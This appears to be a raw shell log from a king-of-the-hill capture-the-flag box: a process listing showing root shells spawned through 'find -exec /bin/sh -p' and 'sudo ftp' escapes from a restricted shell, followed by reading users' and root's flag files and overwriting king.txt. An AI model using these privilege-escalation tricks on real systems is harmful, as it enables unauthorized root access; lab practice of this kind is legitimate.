root       910  0.0  1.0 573896 19200 ?        Ssl  14:26   0:00 /usr/bin/python -Es /usr/sbin/tuned -l -P
root       913  0.0  0.6 356636 11996 ?        Ss   14:26   0:00 php-fpm: master process (/etc/php-fpm.conf)
root       925  0.0  0.2 112840  4292 ?        Ss   14:26   0:00 /usr/sbin/sshd -D
root       927  0.0  0.2 222760  4524 ?        Ssl  14:26   0:00 /usr/sbin/rsyslogd -n
root       929  0.0  0.3 353308  6872 ?        Ss   14:26   0:00 /usr/sbin/nmbd --foreground --no-process-group
root       933  0.0  0.0 110108   856 tty1     Ss+  14:26   0:00 /sbin/agetty --noclear tty1 linux
root       934  0.0  0.0 110108   864 ttyS0    Ss+  14:26   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
po        1061  0.8  8.7 2539780 165372 ?      Sl   14:26   0:13 /usr/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -
named     1068  0.0  3.0 167812 57620 ?        Ssl  14:26   0:00 /usr/sbin/named -u named -c /etc/named.conf
root      1123  0.0  0.8 430424 15484 ?        Ss   14:26   0:00 /usr/sbin/httpd -DFOREGROUND
mysql     1136  0.0  0.0 113312  1600 ?        Ss   14:26   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
mysql     1299  0.0  4.9 1102652 93180 ?       Sl   14:26   0:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64
root      1340  0.0  0.1  89620  2092 ?        Ss   14:26   0:00 /usr/libexec/postfix/master -w
postfix   1341  0.0  0.2  89724  4056 ?        S    14:26   0:00 pickup -l -t unix -u
postfix   1342  0.0  0.2  89792  4084 ?        S    14:26   0:00 qmgr -l -t unix -u
root      1356  0.0  0.6 424844 11636 ?        Ss   14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
po        1357  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1358  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1359  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1360  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1361  0.0  0.3 356636  6024 ?        S    14:26   0:00 php-fpm: pool www
shifu     1388  0.0  1.3 516088 24656 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1389  0.0  1.2 441020 22620 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1391  0.0  1.6 523364 31836 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
root      1401  0.0  0.1 120884  2120 ?        Ss   14:26   0:00 nginx: master process /usr/sbin/nginx
nginx     1402  0.0  0.1 121288  3580 ?        S    14:26   0:00 nginx: worker process
root      1577  0.0  0.1 419748  3116 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1578  0.0  0.1 420204  3164 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1647  0.0  0.1 424828  3200 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1698  0.0  0.3 159308  6040 ?        Ss   14:27   0:00 sshd: shifu [priv]
shifu     1704  0.0  0.1 159308  2424 ?        S    14:27   0:00 sshd: shifu@pts/0
shifu     1708  0.0  0.1 115444  2032 pts/0    Ss   14:27   0:00 -rbash
root      1728  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh ; -quit
shifu     1729  0.0  0.0 115440  1828 pts/0    S    14:27   0:00 /bin/sh
root      1732  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh -p ; -quit
root      1733  0.0  0.1 115444  1912 pts/0    S+   14:27   0:00 /bin/sh -p
shifu     1740  0.0  0.6 431424 12892 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1747  0.0  1.1 513284 21780 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1751  0.0  0.9 510540 18804 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1759  0.0  1.6 523336 31680 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1762  0.0  0.9 436032 17508 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1764  0.0  0.4 430424  8824 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1766  0.0  0.9 510540 18788 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
root      1848  0.0  1.4 437612 27900 pts/0    T    14:31   0:00 /usr/bin/python /usr/bin/yum install kernel-devel-3.10.0-862.el7.x86_64
root      1916  0.0  0.3 159308  6248 ?        Ss   14:36   0:00 sshd: shifu [priv]
shifu     1918  0.0  0.1 159308  2432 ?        S    14:36   0:00 sshd: shifu@pts/1
shifu     1919  0.0  0.1 115444  2012 pts/1    Ss   14:36   0:00 -rbash
root      1938  0.0  0.0      0     0 ?        S    14:36   0:00 [kworker/0:2]
shifu     1964  0.0  0.0 119052  1524 pts/1    S    14:39   0:00 ftp
shifu     1965  0.0  0.1 115440  1888 pts/1    S    14:39   0:00 /bin/sh
root      1999  0.0  0.0      0     0 ?        R    14:41   0:00 [kworker/0:1]
root      2026  0.0  0.2 218524  4020 pts/1    S    14:44   0:00 sudo ftp
root      2027  0.0  0.0 119052  1524 pts/1    S    14:44   0:00 ftp
root      2033  0.0  0.0 115444  1880 pts/1    S    14:45   0:00 /bin/sh
root      2063  0.1  0.0 115444   820 pts/1    S    14:49   0:00 /bin/sh
root      2615  0.1  0.0 115444   804 pts/1    S    14:51   0:00 /bin/sh
root      2724  0.0  0.0 107956   352 pts/1    S    14:51   0:00 sleep 0.1
root      2725  0.0  0.0 107956   356 pts/1    S    14:51   0:00 sleep 0.2
root      2726  0.0  0.0 155372  1872 pts/1    R+   14:51   0:00 ps aux
sh-4.2# cat king.txt
cyber30
sh-4.2# ls
king.txt  koth
sh-4.2# find / -type f -name '*.txt' -o -path '*/.*' -type f -name '*.txt' 2>/dev/null | grep flag
/usr/local/go/src/cmd/go/testdata/script/build_gcflags.txt
/usr/local/go/src/cmd/go/testdata/script/build_runtime_gcflags.txt
/usr/local/go/src/cmd/go/testdata/script/gcflags_patterns.txt
/usr/local/go/src/cmd/go/testdata/script/goflags.txt
/usr/local/go/src/cmd/go/testdata/script/modfile_flag.txt
/usr/local/go/src/cmd/go/testdata/script/test_flag.txt
/usr/local/go/src/cmd/go/testdata/script/vet_flags.txt
/home/po/flag.txt
/home/shifu/flag.txt
/home/tigress/flag.txt
sh-4.2# cat /home/po/flag.txt
MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK
sh-4.2# cat /home/shifu/flag.txt
YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
sh-4.2# cat /home/tigress/flag.txt
Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
sh-4.2# ls
king.txt  koth
sh-4.2# string
sh: string: command not found
sh-4.2# file 
Usage: file [-bchikLlNnprsvz0] [--apple] [--mime-encoding] [--mime-type]
            [-e testname] [-F separator] [-f namefile] [-m magicfiles] file ...
       file -C [-m magicfiles]
       file [--help]
sh-4.2# file koth
koth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), not stripped
sh-4.2# sudo find / -name ".flag" 2>/dev/null
/root/.flag
sh-4.2# cat .flag
NzRjZTk1ZDZhYTVmNTQyZmU5MDliMThkYzA2ZDRiYTMK
sh-4.2# ls -al
total 7340
dr-xr-x---.  5 root root    4096 Apr 12  2020 .
dr-xr-xr-x. 17 root root     224 Apr  8  2020 ..
lrwxrwxrwx   1 root root       9 Apr 10  2020 .bash_history -> /dev/null
-rw-r--r--.  1 root root      18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root     176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root     176 Dec 28  2013 .bashrc
drwxr-xr-x   3 root root      22 Apr 12  2020 .cache
-rw-r--r--.  1 root root     100 Dec 28  2013 .cshrc
-rw-r--r--   1 root root      45 Apr 12  2020 .flag
drwx------   3 root root     104 Apr 10  2020 .gnupg
-rw-------   1 root root       8 Oct  2 14:58 king.txt
-rwxr-xr-x   1 root root 7468711 Apr 12  2020 koth
lrwxrwxrwx   1 root root       9 Apr 11  2020 .mysql_history -> /dev/null
drwxr-----   3 root root      19 Apr 10  2020 .pki
-rw-r--r--.  1 root root     129 Dec 28  2013 .tcshrc
-rw-------   1 root root    6218 Apr 12  2020 .viminfo
sh-4.2# echo cyber30 > king.txt
sh-4.2# cat king.txt
cyber30
sh-4.2# wc .flag
 1  1 45 .flag
